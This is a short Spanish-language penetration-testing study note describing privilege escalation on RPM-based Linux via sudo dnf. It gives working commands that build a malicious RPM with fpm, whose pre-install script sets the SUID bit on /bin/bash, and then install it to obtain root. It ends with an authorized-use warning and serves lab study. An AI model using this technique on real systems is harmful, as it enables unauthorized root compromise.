---
title: "18 - Escalada de Privilegios DNF"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Esta forma de escalar se da en distribuciones de Linux basadas en RPM como fedora:
![[Pasted image 20240415104024.png]]
Desde la máquina atacante generamos un archivo .rpm malicioso que contiene el comando chmod u+s /bin/bash:
```bash
TF=$(mktemp -d)
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```
![[Pasted image 20240415104102.png]]
Lo compartimos con la máquina víctima:
![[Pasted image 20240415103815.png]]
Desde la máquina víctima ejecutamos el siguiente comando:
```bash
sudo /usr/bin/dnf install -y virus.rpm
```
![[Pasted image 20240415103856.png]]
Y ahora ya se habrá ejecutado el comando chmod u+s /bin/bash y podremos escalar a root:
![[Pasted image 20240415103923.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
